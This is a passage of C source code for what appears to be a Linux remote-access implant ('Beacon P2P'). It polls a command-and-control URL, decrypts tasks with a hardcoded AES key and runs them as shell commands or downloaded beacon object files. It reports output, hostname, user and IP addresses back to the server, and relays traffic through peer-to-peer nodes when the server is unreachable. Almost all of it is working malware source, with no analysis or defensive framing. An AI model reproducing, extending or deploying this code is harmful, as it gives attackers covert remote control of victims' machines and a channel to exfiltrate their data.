        free(cipher);
        if (!plain) break;
        switch (hdr.type) {
            case 0: { // ping
                p2p_header_t resp_hdr = { .magic = PEER_MAGIC, .version = PEER_VERSION, .type = 1, .payload_len = 0 };
                write(fd, &resp_hdr, sizeof(resp_hdr));
                break;
            }
            case 2: { // comando
                int out_len;
                char *output = execute_generic_command(plain, &out_len);
                unsigned char iv_out[16];
                RAND_bytes(iv_out, 16);
                int enc_len;
                unsigned char *enc = aes256_cfb_encrypt(AES_KEY, iv_out, (unsigned char*)output, out_len, &enc_len);
                free(output);
                if (enc) {
                    p2p_header_t resp_hdr = { .magic = PEER_MAGIC, .version = PEER_VERSION, .type = 3, .payload_len = enc_len };
                    memcpy(resp_hdr.iv, iv_out, 16);
                    write(fd, &resp_hdr, sizeof(resp_hdr));
                    write(fd, enc, enc_len);
                    free(enc);
                }
                break;
            }
            case 4: { // relay_req
                char *saveptr;
                char *dest = strtok_r(plain, "|", &saveptr);
                char *cmd = strtok_r(NULL, "|", &saveptr);
                if (dest && cmd && strcmp(dest, "C2") == 0) {
                    char *resp = https_request(C2_URL, "POST", cmd);
                    if (resp) {
                        unsigned char iv_out[16];
                        RAND_bytes(iv_out, 16);
                        int enc_len;
                        unsigned char *enc = aes256_cfb_encrypt(AES_KEY, iv_out, (unsigned char*)resp, strlen(resp), &enc_len);
                        if (enc) {
                            p2p_header_t resp_hdr = { .magic = PEER_MAGIC, .version = PEER_VERSION, .type = 5, .payload_len = enc_len };
                            memcpy(resp_hdr.iv, iv_out, 16);
                            write(fd, &resp_hdr, sizeof(resp_hdr));
                            write(fd, enc, enc_len);
                            free(enc);
                        }
                        free(resp - 8);
                    }
                }
                break;
            }
            default:
                break;
        }
        free(plain);
    }
    close(fd);
    return NULL;
}

void *peer_server_thread(void *arg) {
    int listen_fd = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(listen_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
    struct sockaddr_in addr = { .sin_family = AF_INET, .sin_port = htons(PEER_TCP_PORT), .sin_addr.s_addr = INADDR_ANY };
    bind(listen_fd, (struct sockaddr*)&addr, sizeof(addr));
    listen(listen_fd, 10);
    while (1) {
        struct sockaddr_in client;
        socklen_t clen = sizeof(client);
        int client_fd = accept(listen_fd, (struct sockaddr*)&client, &clen);
        if (client_fd < 0) continue;
        pthread_t tid;
        pthread_create(&tid, NULL, handle_peer_connection, (void*)(intptr_t)client_fd);
        pthread_detach(tid);
    }
    return NULL;
}

char* send_to_peer(peer_t *peer, const char *data, int *out_len) {
    if (peer->fd < 0) {
        peer->fd = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(peer->fd, (struct sockaddr*)&peer->addr, sizeof(peer->addr)) < 0) {
            peer->fd = -1;
            return NULL;
        }
        peer->state = 1;
    }
    unsigned char iv[16];
    RAND_bytes(iv, 16);
    int enc_len;
    unsigned char *enc = aes256_cfb_encrypt(AES_KEY, iv, (unsigned char*)data, strlen(data), &enc_len);
    if (!enc) return NULL;
    p2p_header_t hdr = { .magic = PEER_MAGIC, .version = PEER_VERSION, .type = 2, .payload_len = enc_len };
    memcpy(hdr.iv, iv, 16);
    write(peer->fd, &hdr, sizeof(hdr));
    write(peer->fd, enc, enc_len);
    free(enc);
    p2p_header_t resp_hdr;
    if (read(peer->fd, &resp_hdr, sizeof(resp_hdr)) != sizeof(resp_hdr)) return NULL;
    if (resp_hdr.magic != PEER_MAGIC) return NULL;
    uint8_t *cipher = malloc(resp_hdr.payload_len);
    if (!cipher) return NULL;
    read(peer->fd, cipher, resp_hdr.payload_len);
    int plain_len;
    char *plain = (char*)aes256_cfb_decrypt(AES_KEY, resp_hdr.iv, cipher, resp_hdr.payload_len, &plain_len);
    free(cipher);
    if (!plain) return NULL;
    *out_len = plain_len;
    return plain;
}

char* send_to_c2_or_peer(const char *url, const char *method, const char *data, int *out_len) {
    char *resp = https_request(url, method, data);
    if (resp) {
        *out_len = strlen(resp);
        return resp;
    }
    pthread_mutex_lock(&g_peer_lock);
    peer_t *chosen = NULL;
    for (int i=0; i<g_peer_count; i++) {
        if (g_peers[i].state == 1 || g_peers[i].is_gateway) {
            chosen = &g_peers[i];
            break;
        }
    }
    pthread_mutex_unlock(&g_peer_lock);
    if (!chosen) return NULL;
    char relay_buf[8192];
    snprintf(relay_buf, sizeof(relay_buf), "RELAY|C2|%s", data ? data : "");
    char *peer_resp = send_to_peer(chosen, relay_buf, out_len);
    if (peer_resp) {
        return peer_resp;
    }
    return NULL;
}

// =======================================================================
// EJECUTOR DE COMANDOS (unificado para shell y BOF)
// =======================================================================
char* execute_generic_command(const char *cmd, int *out_len) {
    if (strncmp(cmd, "bof:", 4) == 0) {
        char *payload = (char*)cmd + 4;
        while (*payload == ' ') payload++;
        char *space = strchr(payload, ' ');
        char *bof_url = payload;
        char *bof_args = "";
        int bof_arglen = 0;
        if (space) {
            *space = '\0';
            bof_args = space + 1;
            if ((bof_args[0] == '"' || bof_args[0] == '\'') && bof_args[0] == bof_args[strlen(bof_args)-1]) {
                bof_args[strlen(bof_args)-1] = '\0';
                bof_args++;
            }
            bof_arglen = strlen(bof_args);
        }
        size_t bof_size = 0;
        unsigned char* bof_data = download_bof(bof_url, &bof_size);
        if (!bof_data || bof_size == 0) {
            char *err = strdup("[!] Failed to download BOF");
            *out_len = strlen(err);
            return err;
        }
        char *output = run_bof_and_capture(bof_data, (uint32_t)bof_size, bof_args, bof_arglen, out_len);
        free(bof_data - 8);
        return output;
    } else {
        return exec_cmd(cmd, out_len);
    }
}

// =======================================================================
// MAIN
// =======================================================================
int main() {
    printf("[*] Beacon P2P starting...\n");
    srand(time(NULL));

    const char* KEY_HEX = "88a41baa358a779c346d3ea784bc03f50900141bb58435f4c50864c82ff624ff";
    for (int i = 0; i < 32; i++) {
        sscanf(KEY_HEX + i * 2, "%2hhx", &AES_KEY[i]);
    }

    pthread_t disc_tid, server_tid;
    pthread_create(&disc_tid, NULL, peer_discovery_thread, NULL);
    pthread_create(&server_tid, NULL, peer_server_thread, NULL);

    char full_url[512];
    snprintf(full_url, sizeof(full_url), "%s%s%s", C2_URL, MALEABLE, CLIENT_ID);

    while (1) {
        printf("[*] Checking for new command...\n");
        int resp_len;
        char *resp_data = send_to_c2_or_peer(full_url, "GET", NULL, &resp_len);
        if (!resp_data) {
            printf("[-] No response from C2 or peers\n");
            sleep(6);
            continue;
        }

        int enc_len = 0;
        unsigned char* encrypted = base64_decode(resp_data, &enc_len);
        free(resp_data - 8);
        if (!encrypted || enc_len < 16) {
            free(encrypted);
            sleep(6);
            continue;
        }
        unsigned char* iv = encrypted;
        unsigned char* ciphertext = encrypted + 16;
        int plain_len = 0;
        char *plaintext = (char*)aes256_cfb_decrypt(AES_KEY, iv, ciphertext, enc_len - 16, &plain_len);
        free(encrypted);
        if (!plaintext) {
            sleep(6);
            continue;
        }
        plaintext[plain_len] = '\0';
        char *command = plaintext;

        if (strlen(command) == 0) {
            free(plaintext);
            sleep(6);
            continue;
        }
        printf("[*] Received command: '%s'\n", command);

        int out_len = 0;
        char *output = execute_generic_command(command, &out_len);
        if (!output) { output = strdup(""); out_len = 0; }

        char hostname[256];
        gethostname(hostname, sizeof(hostname)-1);
        struct passwd *pw = getpwuid(getuid());
        char* user = pw ? pw->pw_name : "unknown";
        char* ips = get_local_ips();
        char* pwd = getcwd(NULL, 0);
        if (!pwd) pwd = strdup("/");

        cJSON *root = cJSON_CreateObject();
        cJSON_AddStringToObject(root, "output", output);
        cJSON_AddStringToObject(root, "client", "linux");
        cJSON_AddStringToObject(root, "command", command);
        cJSON_AddNumberToObject(root, "pid", (double)getpid());
        cJSON_AddStringToObject(root, "hostname", hostname);
        cJSON_AddStringToObject(root, "ips", ips);
        cJSON_AddStringToObject(root, "user", user);
        cJSON_AddStringToObject(root, "discovered_ips", "");
        cJSON_AddNullToObject(root, "result_portscan");
        cJSON_AddStringToObject(root, "result_pwd", pwd);
        char* json_str = cJSON_PrintUnformatted(root);
        cJSON_Delete(root);

        free(output);
        free(plaintext);
        free(ips);
        free(pwd);

        if (!json_str) {
            sleep(6);
            continue;
        }

        unsigned char iv_out[16];
        RAND_bytes(iv_out, 16);
        int encrypted_len = 0;
        unsigned char* encrypted_resp = aes256_cfb_encrypt(AES_KEY, iv_out, (unsigned char*)json_str, strlen(json_str), &encrypted_len);
        free(json_str);

        if (encrypted_resp) {
            unsigned char* full_enc = malloc(16 + encrypted_len);
            memcpy(full_enc, iv_out, 16);
            memcpy(full_enc + 16, encrypted_resp, encrypted_len);
            char* b64_resp = base64_encode(full_enc, 16 + encrypted_len);
            free(full_enc);
            free(encrypted_resp);

            if (b64_resp) {
                int dummy;
                char *c2_ack = send_to_c2_or_peer(full_url, "POST", b64_resp, &dummy);
                free(b64_resp);
                if (c2_ack) free(c2_ack - 8);
                else printf("[-] Failed to send response\n");
            }
        }
        sleep(6);
    }
    return 0;
}